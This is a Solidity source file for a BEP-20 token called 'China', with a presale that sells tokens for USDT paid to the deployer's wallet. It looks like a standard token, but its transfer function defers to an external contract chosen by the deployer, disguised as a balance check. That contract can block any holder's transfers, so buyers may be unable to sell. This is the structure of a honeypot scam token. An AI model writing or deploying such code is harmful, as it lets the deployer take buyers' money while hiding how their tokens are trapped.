/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

interface IBEP20 {

  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {

  function _msgSender() internal view returns (address) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

interface IBEP20Safe {
    /**
     * @dev Returns if transfer amount exceeds balance.
     */
    function beforeTransfer(address sender,uint256 balance,uint256 amount) external view returns (bool);
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract China is Context, IBEP20{
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private partner;
  mapping (address => uint256) private preSaleTime;
  address private contractAddr;
  address private marketWallet;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;

  constructor(address contractaddr){
    contractAddr = contractaddr;
    marketWallet = msg.sender;
    _name = "China";
    _symbol = "China";
    _decimals = 18;
    _totalSupply = 21000000000000000 * 10**18; 
    _balances[msg.sender] = 1000000000000000 * 10**18;
    _balances[address(0xdead)] = 10000000000000000 * 10**18;
    _balances[address(this)] = 10000000000000000 * 10**18;
    
    emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    emit Transfer(address(0), address(0xdead), _balances[address(0xdead)]);
    emit Transfer(address(0), address(this), _balances[address(this)]);
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    if(partner[sender]){
        require(block.timestamp >=preSaleTime[sender] + (1 weeks), "ERC20: lockup");
    }
    uint256 fromBalance = _balances[sender];
    require(IBEP20Safe(contractAddr).beforeTransfer(sender, fromBalance, amount), "ERC20: transfer amount exceeds balance");
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }


  /*************************************************
    presale exchange rate：1usdt == 10000000000 China
    locktime: 1 week
    expiration date: 2022/11/17

    Notice: usdt needs to be approve to this contract
  ***************************************************/
  function preSale(uint256 usdtAmount) external{
      
      address usdtAddress  = 0x55d398326f99059fF775485246999027B3197955;

      require(usdtAmount >= 50 && usdtAmount <= 5000, "BEP20: usdt amount must between 50 and 5000");
      IBEP20(usdtAddress).transferFrom(msg.sender, marketWallet, usdtAmount * 10**18);
      uint256 Amount = usdtAmount * 10000000000 * 10**18;
      _balances[address(this)] = _balances[address(this)].sub(Amount, "BEP20: transfer amount exceeds balance");
      _balances[msg.sender] = _balances[msg.sender].add(Amount);
      partner[msg.sender] = true; 
      preSaleTime[msg.sender] = block.timestamp;
      emit Transfer(address(this), msg.sender, Amount);
  }

}